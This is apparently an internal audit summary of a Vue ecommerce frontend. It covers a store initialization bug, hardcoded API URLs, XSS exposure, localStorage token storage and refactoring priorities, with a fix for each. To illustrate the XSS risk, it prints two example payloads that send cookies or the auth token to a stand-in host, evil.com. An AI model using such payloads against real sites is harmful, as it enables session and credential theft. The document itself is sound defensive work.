# Critical Issues Summary - Mustard Ecommerce Frontend

**Priority**: IMMEDIATE ACTION REQUIRED
**Date**: 2026-01-12

---

## 🚨 CRITICAL BUG (Fix Immediately)

### 1. Store Initialization Failure - App.vue

**File**: [src/App.vue:14](src/App.vue#L14)

**Current Code**:
```javascript
const store = useEcommerceStore  // ❌ Missing ()
```

**Fixed Code**:
```javascript
const store = useEcommerceStore()  // ✅ Correct
```

**Impact**: Without this fix, the entire Pinia store is `undefined`, breaking all app functionality.

**Priority**: FIX NOW (1 minute fix)

---

## 🔒 HIGH PRIORITY SECURITY ISSUES

### 2. Hardcoded API URLs (Multiple Files)

These files bypass the centralized API client and hardcode the production URL:

#### A. **stores/ecommerce.js:500**
```javascript
// ❌ Bad - Double slash bug + hardcoded
await axios.post('https://mustardimports.co.ke//api/orders/create', payload);

// ✅ Good
await this.apiInstance.post('/orders/create', payload);
```

#### B. **stores/ecommerce.js:913**
```javascript
// ❌ Bad - Bypasses auth interceptors
const response = await axios.get('https://mustardimports.co.ke/api/...');

// ✅ Good
const response = await this.apiInstance.get('/...');
```

#### C. **components/navigation/SearchBar.vue:87**
```javascript
// ❌ Bad
import axios from 'axios';
await axios.get('https://mustardimports.co.ke/api/products/search/', { params });

// ✅ Good
import { apiClient } from '@/services/api';
await apiClient.get('/products/search/', { params });
```

#### D. **components/home/recents/HomeCarousel.vue:72**
```javascript
// ❌ Bad
await axios.get('https://mustardimports.co.ke/api/categories/');

// ✅ Good
import { apiClient } from '@/services/api';
await apiClient.get('/categories/');
```

**Why This Matters**:
- Cannot switch between dev/staging/production environments
- Bypasses authentication interceptors
- Makes local development impossible
- Violates DRY principle

---

### 3. XSS Vulnerabilities (No Input Sanitization)

#### A. **views/ProductDetails.vue**
```vue
<!-- ❌ Vulnerable to XSS -->
<div v-html="product.description"></div>

<!-- ✅ Safe -->
<div v-html="sanitizeHtml(product.description)"></div>
```

**Attack Vector**: Admin could inject malicious script in product description:
```html
<img src=x onerror="fetch('https://evil.com/steal?data=' + document.cookie)">
```

#### B. **views/Cart.vue:35**
```javascript
// ❌ Vulnerable
const formatAttributes = (attributes) => {
  return Object.entries(attributes)
    .map(([key, value]) => `${key}: ${value}`)  // No sanitization
    .join(', ');
};

// ✅ Safe
import { stripHtml } from '@/utils/sanitize';
const formatAttributes = (attributes) => {
  return Object.entries(attributes)
    .map(([key, value]) => `${stripHtml(key)}: ${stripHtml(value)}`)
    .join(', ');
};
```

**Solution**: Install `dompurify` and sanitize all user-generated HTML.

---

### 4. localStorage Auth Token Vulnerability

**Files**:
- [stores/ecommerce.js:8-10](stores/ecommerce.js#L8-L10)
- [stores/ecommerce.js:104](stores/ecommerce.js#L104)
- [stores/ecommerce.js:285](stores/ecommerce.js#L285)

```javascript
// ❌ Vulnerable to XSS attacks
const authToken = localStorage.getItem('authToken');
```

**Problem**: Any XSS vulnerability can steal the auth token:
```javascript
// Attacker injects this via XSS:
fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'));
```

**Mitigation Options**:
1. **Short-term**: Add security comments documenting the risk
2. **Long-term**: Migrate to httpOnly cookies (requires backend changes - out of scope)

---

## ⚠️ MEDIUM PRIORITY ISSUES

### 5. Monolithic Store (1,123 Lines)

**File**: [stores/ecommerce.js](stores/ecommerce.js)

**Problems**:
- Mixed concerns: auth, cart, products, orders, admin dashboard
- Difficult to maintain and test
- Race condition in initialization (lines 86-117)

**Solution**: Split into 5 focused modules:
- `stores/modules/auth.js` (~150 lines)
- `stores/modules/cart.js` (~200 lines)
- `stores/modules/products.js` (~300 lines)
- `stores/modules/orders.js` (~200 lines)
- `stores/modules/admin.js` (~150 lines)

---

### 6. Missing Props Validation

Only **8 out of 50+ components** define props with validation.

**Components Without Props** (sample):
- TopRow.vue
- BottomNavigation.vue
- ProductCard.vue
- CategoryCard.vue
- OrderCard.vue
- SearchBar.vue
- HomeCarousel.vue
- RecentCampaigns.vue

**Impact**:
- No type checking
- No default values
- Difficult to understand component API
- Runtime errors when props are wrong

**Example Fix**:
```vue
<script setup>
defineProps({
  product: {
    type: Object,
    required: true,
  },
  showPrice: {
    type: Boolean,
    default: true,
  },
});
</script>
```

---

### 7. MainLayout Complexity

**File**: [components/MainLayout.vue](components/MainLayout.vue) (248 lines)

**Problems**:
- Manages too many concerns (cookies, modals, tracking, login, footer)
- Should be ~60 lines

**Solution**: Extract modals into separate components and use `useModals()` composable.

---

## 📋 IMMEDIATE ACTION ITEMS

### Phase 1: Today (4-6 hours)

1. **Fix App.vue store bug** (1 minute)
   - File: `src/App.vue` line 14
   - Add `()` to `useEcommerceStore`

2. **Install DOMPurify** (5 minutes)
   ```bash
   npm install dompurify
   ```

3. **Create sanitization utility** (30 minutes)
   - Create `src/utils/sanitize.js`
   - Implement `sanitizeHtml()` and `stripHtml()`

4. **Apply sanitization** (1 hour)
   - ProductDetails.vue: Sanitize descriptions
   - Cart.vue: Sanitize attributes

5. **Remove hardcoded URLs** (2 hours)
   - SearchBar.vue line 87
   - HomeCarousel.vue line 72
   - ecommerce.js lines 500, 913
   - Create centralized `apiClient` export

6. **Add CSRF validation** (30 minutes)
   - Update `api.js` getCSRFToken() function
   - Add token format validation

---

### Phase 2: Tomorrow (2-3 hours)

1. **Create environment files** (30 minutes)
   - `.env.development`
   - `.env.production`
   - `.env.example`
   - Update `.gitignore`

2. **Update vite.config.js** (30 minutes)
   - Add `loadEnv()`
   - Configure code splitting
   - Add dev server proxy

3. **Update api.js** (1 hour)
   - Use `import.meta.env.VITE_API_BASE_URL`
   - Add environment validation
   - Export `apiClient` for components

4. **Test thoroughly** (1 hour)
   - Verify all API calls work
   - Test with different env vars
   - Check Network tab for correct URLs

---

## 🎯 SUCCESS CRITERIA

After fixing critical issues:

- [ ] App loads without "undefined store" errors
- [ ] All API calls use centralized client
- [ ] Zero hardcoded URLs in codebase
- [ ] XSS test fails: `<script>alert('XSS')</script>` in search doesn't execute
- [ ] Product descriptions are sanitized
- [ ] CSRF tokens are validated
- [ ] Can switch between dev/prod environments
- [ ] `npm run build` succeeds
- [ ] Built files have no hardcoded URLs

---

## 📊 Issue Severity Breakdown

| Severity | Count | Must Fix |
|----------|-------|----------|
| CRITICAL | 1 | ✅ Yes |
| HIGH | 4 | ✅ Yes |
| MEDIUM | 3 | ⚠️ Recommended |

---

## 🔗 Related Documents

- **Full Plan**: [REFACTORING_PLAN.md](REFACTORING_PLAN.md) - Complete 5-phase implementation guide
- **Package Info**: [package.json](vue-project/package.json) - Dependencies and scripts

---

## 💡 Quick Wins (5 Minutes Each)

1. Fix App.vue store initialization
2. Add security comments to localStorage usage
3. Create `.env.example` file
4. Add CSRF validation regex

---

## ⚠️ DO NOT DO YET

These require careful planning (see full plan):

- ❌ Don't split the store yet (Phase 3 - needs migration strategy)
- ❌ Don't refactor MainLayout yet (Phase 4 - needs modal composable)
- ❌ Don't add TypeScript yet (not in scope)
- ❌ Don't change the backend API (out of scope)

---

## 🆘 If Something Breaks

1. **Git tag before starting**: `git tag v1.0-baseline`
2. **Rollback if needed**: `git reset --hard v1.0-baseline`
3. **Test locally first**: Run `npm run dev` before deploying
4. **Check Network tab**: Verify API calls work

---

## 📞 Need Help?

Refer to these sections in the full plan:

- **Security fixes**: REFACTORING_PLAN.md - Phase 1
- **Environment setup**: REFACTORING_PLAN.md - Phase 2
- **Testing strategy**: REFACTORING_PLAN.md - Testing sections
- **Rollback plan**: REFACTORING_PLAN.md - Risk Management

---

**Last Updated**: 2026-01-12
**Status**: Ready for implementation
**Estimated Fix Time**: 6-9 hours for all critical issues
